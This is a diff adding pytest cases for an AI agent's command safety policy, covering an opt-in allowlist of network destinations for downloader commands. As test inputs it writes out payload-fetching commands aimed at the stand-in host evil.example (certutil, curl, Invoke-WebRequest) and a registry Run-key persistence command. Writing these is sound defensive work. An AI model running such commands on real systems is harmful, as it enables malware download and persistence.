@@ -405,6 +405,8 @@ def _patch_config(
     custom_patterns=None,
     approval_categories=None,
     approval_timeout_seconds: int = 300,
+    enable_network_destination_allowlist: bool = False,
+    network_destination_allowlist=None,
 ):
     monkeypatch.setattr(
         module,
@@ -416,6 +418,8 @@ def _patch_config(
                 policy._APPROVAL_TIER_DEFAULT_CATEGORIES if approval_categories is None else approval_categories
             ),
             "approval_timeout_seconds": approval_timeout_seconds,
+            "enable_network_destination_allowlist": enable_network_destination_allowlist,
+            "network_destination_allowlist": network_destination_allowlist or [],
         },
     )
 
@@ -836,3 +840,215 @@ def test_get_config_enforce_policy_still_disables_on_explicit_false(monkeypatch)
     cfg = _real_get_config(None)
 
     assert cfg["enforce_policy"] is False
+
+
+# ------------------------------------------------------------------
+# Phase I: advisory network-destination allowlist
+# ------------------------------------------------------------------
+
+@pytest.mark.parametrize(
+    "command,expected_host",
+    [
+        ("curl http://pypi.org/simple/foo -o foo.whl", "pypi.org"),
+        ("wget https://github.com/foo/bar/archive/refs/heads/main.zip", "github.com"),
+        ('Invoke-WebRequest -Uri "http://evil.example/x" -OutFile x.exe', "evil.example"),
+        ("iwr -Uri https://npmjs.org/package/foo", "npmjs.org"),
+        ("certutil -urlcache -f http://evil.example/payload.exe out.exe", "evil.example"),
+        ("Start-BitsTransfer -Source https://nuget.org/pkg -Destination x.nupkg", "nuget.org"),
+    ],
+)
+def test_extract_network_destination_finds_host(command, expected_host):
+    assert policy.extract_network_destination(command) == expected_host
+
+
+def test_extract_network_destination_empty_when_no_url():
+    assert policy.extract_network_destination("dir C:\\Windows") == ""
+
+
+def test_extract_network_destination_lowercases_host():
+    assert policy.extract_network_destination("curl HTTP://PyPI.ORG/x") == "pypi.org"
+
+
+def test_extract_network_destination_empty_on_malformed_url():
+    assert policy.extract_network_destination("curl http://") == ""
+
+
+@pytest.mark.parametrize(
+    "host,allowlist,expected",
+    [
+        ("pypi.org", ["pypi.org", "github.com"], True),
+        ("api.github.com", ["github.com"], True),  # subdomain match
+        ("evil.example", ["pypi.org", "github.com"], False),
+        ("pypi.org.evil.example", ["pypi.org"], False),  # not a real subdomain, just a lookalike prefix
+        ("", ["pypi.org"], False),
+        ("pypi.org", [], False),
+        ("PyPI.ORG", ["pypi.org"], True),  # case-insensitive
+    ],
+)
+def test_is_allowed_network_destination(host, allowlist, expected):
+    assert policy.is_allowed_network_destination(host, allowlist) is expected
+
+
+def test_classify_command_downloader_auto_allowed_when_host_on_allowlist():
+    decision = policy.classify_command(
+        "curl http://pypi.org/simple/foo -o foo.whl",
+        enable_network_allowlist=True,
+        network_allowlist=["pypi.org"],
+    )
+
+    assert decision.allowed is True
+    assert decision.network_destination == "pypi.org"
+    assert decision.network_destination_allowed is True
+
+
+def test_classify_command_downloader_stays_denied_when_host_not_on_allowlist():
+    decision = policy.classify_command(
+        "curl http://evil.example/x -o x.exe",
+        enable_network_allowlist=True,
+        network_allowlist=["pypi.org"],
+    )
+
+    assert decision.allowed is False
+    assert decision.category == "downloader"
+    assert decision.network_destination == "evil.example"
+    assert decision.network_destination_allowed is False
+
+
+def test_classify_command_downloader_ignores_allowlist_when_disabled():
+    """Even if the host would match, enable_network_allowlist=False (the
+    default) means the category's normal tier still applies - opt-in,
+    not a silent behavior change."""
+    decision = policy.classify_command(
+        "curl http://pypi.org/simple/foo -o foo.whl",
+        enable_network_allowlist=False,
+        network_allowlist=["pypi.org"],
+    )
+
+    assert decision.allowed is False
+    assert decision.category == "downloader"
+
+
+def test_classify_command_downloader_without_url_falls_through_to_normal_tier():
+    """A downloader-category match with no extractable URL (e.g. the URL
+    is built from a variable) can't be checked against the allowlist -
+    falls back to the category's normal deny/approve tier, not silently
+    allowed."""
+    decision = policy.classify_command(
+        "curl $url -o out.exe",
+        enable_network_allowlist=True,
+        network_allowlist=["pypi.org"],
+    )
+
+    assert decision.allowed is False
+    assert decision.category == "downloader"
+    assert decision.network_destination == ""
+
+
+def test_classify_command_non_downloader_category_unaffected_by_allowlist():
+    decision = policy.classify_command(
+        "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x",
+        enable_network_allowlist=True,
+        network_allowlist=["pypi.org"],
+    )
+
+    assert decision.allowed is False
+    assert decision.category == "persistence"
+    assert decision.network_destination == ""
+
+
+def test_classify_source_code_downloader_auto_allowed_via_shellout_call():
+    decision = policy.classify_source_code(
+        'subprocess.run("curl http://pypi.org/simple/foo")',
+        enable_network_allowlist=True,
+        network_allowlist=["pypi.org"],
+    )
+
+    assert decision.allowed is True
+
+
+# ------------------------------------------------------------------
+# Phase I: config.py new fields
+# ------------------------------------------------------------------
+
+def test_get_config_network_allowlist_defaults(monkeypatch):
+    import helpers.plugins as plugins_module
+
+    monkeypatch.setattr(plugins_module, "get_plugin_config", lambda plugin_name, agent=None: {})
+
+    cfg = _real_get_config(None)
+
+    assert cfg["enable_network_destination_allowlist"] is False
+    assert cfg["network_destination_allowlist"] == [
+        "nuget.org", "npmjs.org", "pypi.org", "github.com", "localhost", "127.0.0.1",
+    ]
+
+
+def test_get_config_network_allowlist_reads_stored_values(monkeypatch):
+    import helpers.plugins as plugins_module
+
+    monkeypatch.setattr(
+        plugins_module,
+        "get_plugin_config",
+        lambda plugin_name, agent=None: {
+            "enable_network_destination_allowlist": True,
+            "network_destination_allowlist": "pypi.org\ngithub.com",
+        },
+    )
+
+    cfg = _real_get_config(None)
+
+    assert cfg["enable_network_destination_allowlist"] is True
+    assert cfg["network_destination_allowlist"] == ["pypi.org", "github.com"]
+
+
+# ------------------------------------------------------------------
+# Phase I: extension wiring - message + audit log include destination info
+# ------------------------------------------------------------------
+
+@pytest.mark.asyncio
+async def test_extension_auto_allows_downloader_to_allowlisted_host(monkeypatch, tmp_path):
+    import plugins._safety_policy.extensions.python.tool_execute_before._05_command_policy as module
+
+    _patch_config(
+        monkeypatch, module, enforce_policy=True,
+        enable_network_destination_allowlist=True,
+        network_destination_allowlist=["pypi.org"],
+    )
+    agent = _FakeAgent()
+    ext = SafetyCommandPolicy(agent=agent)
+
+    await ext.execute(
+        tool_name="code_execution_tool",
+        tool_args={"runtime": "terminal", "code": "curl http://pypi.org/simple/foo -o foo.whl"},
+    )  # must not raise
+
+    assert agent.context.log.entries == []
+
+
+@pytest.mark.asyncio
+async def test_extension_denial_message_includes_destination_note(monkeypatch, tmp_path):
+    import plugins._safety_policy.extensions.python.tool_execute_before._05_command_policy as module
+
+    _patch_config(
+        monkeypatch, module, enforce_policy=True,
+        enable_network_destination_allowlist=True,
+        network_destination_allowlist=["pypi.org"],
+    )
+    log_path = tmp_path / "audit.jsonl"
+    monkeypatch.setattr(audit_log, "get_audit_log_path", lambda: str(log_path))
+    agent = _FakeAgent()
+    ext = SafetyCommandPolicy(agent=agent)
+
+    with pytest.raises(RepairableException) as exc_info:
+        await ext.execute(
+            tool_name="code_execution_tool",
+            tool_args={"runtime": "terminal", "code": "curl http://evil.example/x -o x.exe"},
+        )
+
+    assert "evil.example" in str(exc_info.value)
+    assert "not on the configured allowlist" in str(exc_info.value)
+
+    lines = log_path.read_text(encoding="utf-8").strip().splitlines()
+    record = json.loads(lines[-1])
+    assert record["network_destination"] == "evil.example"
+    assert record["network_destination_allowed"] is False
